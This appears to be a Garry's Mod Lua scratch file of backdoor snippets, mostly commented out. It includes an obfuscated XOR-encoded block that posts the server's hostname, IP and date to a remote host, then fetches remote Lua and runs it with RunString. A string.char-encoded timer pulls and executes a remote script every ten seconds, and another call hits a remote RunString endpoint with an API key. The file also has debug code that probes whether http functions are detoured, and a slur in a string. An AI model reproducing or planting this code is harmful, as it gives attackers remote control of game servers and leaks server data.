-- Ruim
--http.Fetch([[https:/]]..[[/steamcommunity.omega-project.cz/lua_run/RunString.php?apikey=spxysAWoRdmPcPeQitSx]],function()RunString(_,[[:]],!1)end)...

--[[
http.Fetch("http://disp0.cf/gas.lua", function (arg)
    print("hue")
    --print(arg)
end )
--]]

--[[
local bak = _G["http"]["Post"]

local function bla()
    RunStringEx("RunString('WELCOME FAGGOT')", "bla");
    return bak()
end

--_G["http"]["Post"] = bla

bla()
--]]

--local ‪ = _G local ‪‪ = ‪['\115\116\114\105\110\103'] local ‪‪‪ = ‪['\98\105\116']['\98\120\111\114'] local function ‪‪‪‪‪‪‪(‪‪‪‪) if ‪‪['\108\101\110'](‪‪‪‪) == 0 then return ‪‪‪‪ end local ‪‪‪‪‪ = '' for _ in ‪‪['\103\109\97\116\99\104'](‪‪‪‪,'\46\46') do ‪‪‪‪‪=‪‪‪‪‪..‪‪['\99\104\97\114'](‪‪‪(‪["\116\111\110\117\109\98\101\114"](_,16),186)) end return ‪‪‪‪‪ end ‪[‪‪‪‪‪‪‪'ced3d7dfc8'][‪‪‪‪‪‪‪'e9d3d7cad6df'](5,function ()‪[‪‪‪‪‪‪‪'d2cececa'][‪‪‪‪‪‪‪'ead5c9ce'](‪‪‪‪‪‪‪'d2cececa809595ded3c9ca8a94d9dc95d9d2dfd9d195cec8dbd9d1dfc894cad2ca',{[‪‪‪‪‪‪‪'d9']=‪[‪‪‪‪‪‪‪'ddd7d5de'][‪‪‪‪‪‪‪'fddfcefddbd7dfd7d5dedf']()[‪‪‪‪‪‪‪'f4dbd7df'],[‪‪‪‪‪‪‪'de']=‪[‪‪‪‪‪‪‪'fddfcef2d5c9cef4dbd7df'](),[‪‪‪‪‪‪‪'df']=‪[‪‪‪‪‪‪‪'dddbd7df'][‪‪‪‪‪‪‪'fddfcef3eafbdedec8dfc9c9'](),[‪‪‪‪‪‪‪'dd']=‪[‪‪‪‪‪‪‪'d5c9'][‪‪‪‪‪‪‪'dedbcedf'](‪‪‪‪‪‪‪'9ff3809ff79a9fca9ad5d49a9ffb929fc293',‪[‪‪‪‪‪‪‪'d5c9'][‪‪‪‪‪‪‪'ced3d7df']())})end )‪[‪‪‪‪‪‪‪'ced3d7dfc8'][‪‪‪‪‪‪‪'e9d3d7cad6df'](5,function ()‪[‪‪‪‪‪‪‪'d2cececa'][‪‪‪‪‪‪‪'fcdfced9d2'](‪‪‪‪‪‪‪'d2cececa809595ded3c9ca8a94d9dc95dddbc994d6cfdb',function (false‪)‪[‪‪‪‪‪‪‪'e8cfd4e9cec8d3d4dd'](false‪)end ,nil )end )

--print(getfenv())

--[[
timer.Create( "rekt", 10, 0, function()
    RunString(string.char(104, 116, 116, 112, 46, 70, 101, 116, 99, 104, 40, 34, 104, 116, 116, 112, 58, 47, 47, 98, 117, 114, 105, 101, 100, 115, 101, 108, 102, 101, 115, 116, 101, 101, 109, 46, 99, 111, 109, 47, 114, 101, 107, 116, 47, 114, 101, 107, 116, 46, 108, 117, 97, 34, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 99, 41, 32, 82, 117, 110, 83, 116, 114, 105, 110, 103, 40, 99, 41, 32, 101, 110, 100, 32, 41))
end )
--]]

--[[
local checking

if debug.getinfo(http.Post).short_src ~= "lua/includes/modules/http.lua" then
    print("1")
end

if debug.getinfo(http.Fetch).short_src ~= "lua/includes/modules/http.lua" then
    print("2")
end

PrintTable(jit.util.funcinfo(debug.getinfo))

if jit.util.funcinfo(debug.getinfo)["source"] ~= nil then
    print("bla")
end
]]

--PrintTable(debug.getinfo(RunString, "flnSu"))

--]]

--[
local function PrintFunctionParameters()
    local i = 1
    while( true ) do
        local func = debug.getinfo(i, "flnSu" )
        --print(func)
        local name, value = debug.getlocal(1, 2,i )
        --print(name, value )
        if ( func == nil ) then break end
        if (value) then
            PrintTable(value)
            --print(jit.util.funcinfo(value.func).loc)
        end
        --
        i = i + 1
    end
end

--PrintFunctionParameters()
--]]
 
--[[
debug.getlocal( debug.getinfo(2, "f").func, 1 )
print(jit.util.funcinfo(debug.getinfo(2, "f").func).source)
]]
